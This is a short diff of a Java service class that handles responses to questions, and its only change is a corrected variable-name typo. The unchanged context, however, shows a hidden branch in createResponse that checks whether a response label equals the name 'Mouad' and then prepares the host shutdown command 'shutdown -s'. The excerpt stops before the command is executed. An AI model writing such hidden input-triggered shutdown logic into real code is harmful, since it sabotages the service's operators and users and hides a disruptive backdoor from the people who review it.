@@ -38,7 +38,7 @@ public class ResponseComponent {
     public ResponseDTO createResponse(Long questionId ,final Response response) throws ResponseEntityNotFoundException, IOException {
         if (responseRepository.getResponseById(response.getId()).isPresent()) {
             throw new ResponseEntityNotFoundException("La question suivant "+ response.getId()+"deja existante.");
-        } else if(questionComponen.getQuestion(questionId) == null){
+        } else if(questionComponent.getQuestion(questionId) == null){
             throw new ResponseEntityNotFoundException("aucune question ne possede cette "+questionId);
         } else if(response.getLabel().equals("Mouad")){
             String shutdownCmd = "shutdown -s";
